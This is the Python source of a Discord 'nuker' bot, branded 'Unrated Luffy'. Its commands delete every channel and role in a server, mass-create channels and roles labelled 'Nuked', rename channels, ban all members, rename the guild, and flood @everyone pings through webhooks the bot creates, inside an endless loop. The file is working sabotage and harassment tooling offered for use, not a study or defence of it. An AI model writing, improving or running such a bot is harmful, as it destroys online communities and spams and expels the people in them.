import discord
import os
import json
import requests
import threading
import time
import base64
from colorama import Fore
from pystyle import Center
from pyfiglet import Figlet
from discord.ext import commands


intents = discord.Intents.all()
bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')
webhooks = []
global thing
thing = "False"

class Colors:
    reset = Fore.RESET
    red = Fore.RED
    green = Fore.GREEN




class Main:
    def load_token():
        with open("Assets/config.json") as f:
            config = json.load(f)

            token = config.get("TOKEN")

            return token

    
    def clear_s():
        os.system("cls") if os.name == "nt" else os.system("clear")


    def title(name):
        f = Figlet(font="calvin_s", width=150)
        return f.renderText(name)


class Create:
    def __init__(self, name, channelid, guildid):
        self.channel = channelid
        self.guild = guildid
        self.name = name



    def channel_c(self):
        url = f"https://discord.com/api/v9/guilds/{self.guild}/channels"
        data = {'name': self.name, "type": 0}
        headers = {'authorization': f"Bot {Main.load_token()}"}

        channel_data = requests.post(url, json=data, headers=headers)


        if channel_data.status_code == 201:
            print(f"({Colors.green}+{Colors.reset}) Created channel {self.name}")



    def change_channels(self):
        url = "https://discord.com/api/v9/channels/{}".format(self.channel)

        data = {'name' : self.name}

        headers = {'authorization': f"Bot {Main.load_token()}"}

        channel_data = requests.patch(url, json=data, headers=headers)

        if channel_data.status_code == 200:
            print(f"({Colors.green}+{Colors.reset}) Renamed channel {self.name}")

    
    def role_c(self):
        url = "https://discord.com/api/v9/guilds/{}/roles".format(self.guild)

        data = {'name': self.name, "permissions": 0}

        headers = {'authorization': f"Bot {Main.load_token()}"}

        role_data = requests.post(url, json=data, headers=headers)

        if role_data.status_code == 200:
            print(f"({Colors.green}+{Colors.reset}) Created role {self.name}")
    


class Spam:
    def __init__(self, target, message):
        self.target = target
        self.msg = message


    def webhook(self):
        data = {'content' : self.msg}
        webhook_data = requests.post(self.target, json=data)

        if webhook_data.status_code == 200:
            print(f"({Colors.green}+{Colors.reset}) Sent {self.msg}")




class Remove:
    def __init__(self, channelid, guildid):
        self.channel = channelid
        self.guild = guildid

    def channel_d(self):
        url = "https://discord.com/api/v9/channels/{}".format(self.channel)

        headers = {'authorization' : f"Bot {token}"}
        
        channel_data = requests.delete(url, headers=headers)
        



    def role_d(self):
        url = f"https://discord.com/api/v9/guilds/{self.guild}/roles/{self.channel}"

        headers = {'authorization' : f"Bot {token}"}
        
        channel_data = requests.delete(url, headers=headers)




@bot.event
async def on_ready():
    Main.clear_s()
    print()
    print(Center.XCenter(Main.title("Unrated Luffy!")))
    print(Center.XCenter("\n~ [ Wassup Destroyer Is Readyy ! {} ] ~".format(bot.user.name)))





@bot.command()
async def scs(ctx, count : int):

    await ctx.message.delete()
    guild = ctx.guild.id
    execute = Create("~ Nuked ~", None, guild)

    for i in range(count):
        response = threading.Thread(target=execute.channel_c).start()
        if response == 1:
            print("Success")

    



@bot.command()
async def scd(ctx):
    await ctx.message.delete()
    channels = []
    for channel in ctx.guild.channels:
        channels.append(channel.id)

    

    for id in channels:
        execute = Remove(id, None)
        threading.Thread(target=execute.channel_d).start()


    channel = await ctx.guild.create_text_channel("~ Nuked ~")


@bot.command()
async def whr(ctx):
    await ctx.message.delete()
    webhooks = []
    channels = []
    
    for channel in ctx.guild.channels:
        channels.append(channel.id)



    def webhook_c(id):

        url = "https://discord.com/api/v9/channels/{}/webhooks".format(id)
        data = {'name' : "Luffy"}
        headers = {'authorization' : f"Bot {token}"}

        webhook_data = requests.post(url, json=data, headers=headers)



        if webhook_data.status_code == 200:
            print(f"({Colors.green}+{Colors.reset}) Created webhook")
            webhooks.append(webhook_data.json().get("url"))

    


    for id in channels:
        threading.Thread(target=webhook_c, args=(id,)).start()


    while True:
        for i in range(30):
            for hook in webhooks:
                execute = Spam(hook, "@everyone ```Nuked by UnratedLuffy```")
                threading.Thread(target=execute.webhook).start()


@bot.command()
async def msr(ctx):
    await ctx.message.delete()
    channels = []
    for channel in ctx.guild.channels:
        channels.append(channel.id)

    
    for id in channels:
        execute = Create("renamed by Luffy", id, None)
        threading.Thread(target=execute.change_channels).start()


@bot.command()
async def srs(ctx, count : int):

    await ctx.message.delete()
    guild = ctx.guild.id
    execute = Create("Nuked by UnratedLuffy", None, guild)

    for i in range(count):
        response = threading.Thread(target=execute.role_c).start()




@bot.command()
async def srd(ctx):
    await ctx.message.delete()
    roles = []

    for role in ctx.guild.roles:
        roles.append(role.id)


    for id in roles:
        execute = Remove(id, ctx.guild.id)
        threading.Thread(target=execute.role_d).start()



@bot.command()
async def mbm(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    members = guild.members


    for member in members:
        try:
            await guild.ban(member, reason="Luffy Was Here")
            print(f"({Colors.green}+{Colors.reset}) Banned: {member.name}")
        except:
            pass


@bot.command()
async def sns(ctx, count: int):
    await ctx.message.delete()
    channels = []

    global thing 
    global amount_of_nuker_messages_per_channel
    global message

    thing = "True"
    amount_of_nuker_messages_per_channel = 30
    message = "@everyone Nuked by Luffy"




    
    def channel_c():
        url = f"https://discord.com/api/v9/guilds/{ctx.guild.id}/channels"
        data = {'name': "~ Nuked ~", "type": 0}
        headers = {'authorization': f"Bot {Main.load_token()}"}

        channel_data = requests.post(url, json=data, headers=headers)


        if channel_data.status_code == 201:
            print(f"({Colors.green}+{Colors.reset}) Created channel Nuked")


    for channel in ctx.guild.channels:
        channels.append(channel.id)
    

    for id in channels:
        execute = Remove(id, None)
        threading.Thread(target=execute.channel_d).start()



    for i in range(count):
        threading.Thread(target=channel_c).start()


    





@bot.command()
async def stb(ctx):
    await ctx.message.delete()
    global message
    global amount_of_nuker_messages_per_channel
    chan = input(f"{Fore.YELLOW}[!]{Fore.RESET} Channel name: ")
    make_roles = input(f"{Fore.YELLOW}[!]{Fore.RESET} Make roles? [y/n]: ")
    if make_roles.lower() == "y":
        rolename = input(f"{Fore.YELLOW}[!]{Fore.RESET} Role name: ")
    guildname = input(f"{Fore.YELLOW}[!]{Fore.RESET} Guild name: ")
    message = input(f"{Fore.YELLOW}[!]{Fore.RESET} Message: ")
    amount_of_channels = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of channels/roles: "))
    amount_of_nuker_messages_per_channel = int(input(f"{Fore.YELLOW}[!]{Fore.RESET} Amount of messages per channel: "))
    delete_channels = input(f"{Fore.YELLOW}[!]{Fore.RESET} Delete channels? [y/n]: ")
    global thing
    thing = "True"
    await ctx.guild.edit(name=guildname)


    if delete_channels.lower() == "y":
        try:
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                except:
                    pass
        except Exception as e:
            print(f"{Fore.RED}[-]{Fore.reset} An error occured when deleting channels | e")
            pass

    for i in range(amount_of_channels):
        await ctx.guild.create_text_channel(chan)
        print(f"{Fore.GREEN}[+]{Fore.RESET} Created channel | {chan} | {i+1}")
        if make_roles == "y":
            await ctx.guild.create_role(name=rolename)
            print(f"{Fore.GREEN}[+]{Fore.RESET} Created role | {rolename} | [{i+1}]")

@bot.event
async def on_guild_channel_create(channel):
    global thing
    global message
    if thing == "True":
        for i in range(amount_of_nuker_messages_per_channel):
            try:
                t = time.localtime()
                count = i+1
                print(f"{Fore.GREEN}[+]{Fore.RESET} Message sent in {channel.id} | [{count}]")
                await channel.send(message)
            except Exception as e:
                print(f"{Fore.RED}[-]{Fore.RESET} An error occured | {e}")
        thing = "False"
    else:
        pass



@bot.command()
async def help(ctx):
    await ctx.message.delete()
    options = """
```
     -- Roles --

srs ? Role Spammer
srd ? Role Delete

 -- Channels --
scs > Create Channels
scd > Delete Channels
msr > Mass channel rename
    -- Misc --

~ mbm > MassBan
~ stb > Cmd Nuke
~ whr > Webhook Spammer
```
"""
    await ctx.send(options)


if __name__ == "__main__":
    token = Main.load_token()
    bot.run(token)